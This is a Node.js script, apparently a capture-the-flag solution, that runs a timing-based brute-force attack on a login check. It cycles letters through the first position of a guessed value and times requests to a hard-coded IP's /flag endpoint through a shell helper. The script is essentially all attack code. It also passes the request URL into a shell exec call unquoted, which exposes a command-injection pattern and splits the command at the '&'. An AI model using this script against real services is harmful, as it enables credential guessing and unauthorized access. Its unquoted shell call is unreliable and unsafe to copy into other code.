import fetch from "node-fetch";
import * as child from "child_process";

const request = async(password) => {
  // let a = performance.now();
  // const response = await fetch(`http://167.99.77.149:32337/flag?username=${password}&password=a`);
  // let b = performance.now()
  // const text = await response.text();
  // console.log(a-b, text);

  child.exec(`./curltime.sh http://167.99.77.149:32337/flag?username=${password}&password=a`)
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let alpha = Array.from(Array(26)).map((e, i) => i + 65);
const upper_alphabet = alpha.map((x) => String.fromCharCode(x));

alpha = Array.from(Array(26)).map((e, i) => i + 97);
const lower_alphabet = alpha.map((x) => String.fromCharCode(x));
const alphabet = upper_alphabet.concat(lower_alphabet)

function setCharAt(str,index,chr) {
  if(index > str.length-1) return str;
  return str.substring(0,index) + chr + str.substring(index+1);
}

async function main() {
  let passwordString = "aaaaaaaaaa";
  for (let i = 0; i<alphabet.length; i++) {
    passwordString = setCharAt(passwordString, 0, alphabet[i])
    console.log(passwordString)
    request(passwordString);
    await sleep(1000);
    // count++;
  }
}

main();
